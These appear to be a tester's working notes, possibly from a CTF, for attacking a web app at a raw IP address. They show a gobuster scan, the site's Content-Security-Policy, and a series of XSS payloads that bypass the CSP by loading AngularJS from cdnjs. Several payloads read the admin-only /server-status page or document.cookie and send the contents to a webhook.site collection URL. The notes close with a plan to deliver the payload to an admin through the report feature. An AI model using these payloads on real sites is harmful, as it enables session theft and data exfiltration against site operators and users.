```bash
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://103.77.175.40:8222/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Downloads/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 320]
Progress: 17769 / 17769 (100.00%)
===============================================================
Finished
===============================================================
```

**Content-Security-Policy:** 
- default-src 'self': 
- **script-src 'self' https://cdnjs.cloudflare.com:**
- **style-src 'self' 'unsafe-inline' https://fonts.googleapis.com:**
- font-src 'self' https://fonts.gstatic.com; 
- **img-src 'self' data: ***

attack - vector: 
1.  Inject CSS, HTML into the system using the whisper function
	- Payload `<img src=x onerror="alert(1)">` (failed): The payload is injected, but the code was not executed.
	- Payload `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="page = fetch("/server-status");">` got from CSP bypass search: work 

**Payload 1:**
```html
<img src=x onerror="alert(1)">
```
*Failed: The payload is injected, but the code was not executed.*

**Payload 2:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
<div ng-app>
	<img src=x ng-on-error="
		window = $event.target.ownerDocument.defaultView;
		window.alert(window.origin);
	">
</div>
```
*Success: Got the payload from https://cspbypass.com/.*

**Payload 3:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
<div ng-app>
	<img src=x ng-on-error="
		webhook = 'https://webhook.site/94c9f31d-eb41-4728-aa5d-f6986d6d5532';
		window = $event.target.ownerDocument.defaultView;
		window.location = webhook;
	">
</div>
```
*Success*

**Payload 3:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
<div ng-app>
	<img src=x ng-on-error="
		window = $event.target.ownerDocument.defaultView;
		window.fetch('/server-status')
		.then(r => r.text());
	">
</div>
```
*Failed*

**Payload 4:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
<div ng-app>
	<img src=x ng-on-error="
		window = $event.target.ownerDocument.defaultView;
		window.fetch('/server-status')
		.then(function(r) { 
			return r.text();
		});
	">
</div>
```
*Failed*

**Payload 5:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
<div ng-app>
	<img src=x ng-on-error="
		w = $event.target.ownerDocument.defaultView;
		xhr = w.Reflect.construct(w.XMLHttpRequest, []);
		xhr.open('GET', '/server-status', false);
		xhr.send();
		w.location = 'https://webhook.site/94c9f31d-eb41-4728-aa5d-f6986d6d5532/?d=' + btoa(xhr.responseText);
	">
</div>
```

**Payload 6:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
<div ng-app>
    <img src=x ng-on-error="
        w = $event.target.ownerDocument.defaultView;
        xhr = w.Reflect.construct(w.XMLHttpRequest, []);
        xhr.open('GET', 'http://127.0.0.1/server-status', false);
        xhr.send();
        w.location = 'https://webhook.site/94c9f31d-eb41-4728-aa5d-f6986d6d5532/?d=' + w.encodeURIComponent(w.btoa(xhr.responseText));
    ">
</div>
```

**Payload 7:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script>
<div ng-app>	
	<img src=x ng-on-error="
	    w = $event.target.ownerDocument.defaultView;
	    w.location = 'https://webhook.site/94c9f31d-eb41-4728-aa5d-f6986d6d5532/?c=' + w.encodeURIComponent(w.document.cookie);
	">
</div>
```

**Payload 8:**
- Send the payload to the admin through report function
	
- Fetch the /server-status page 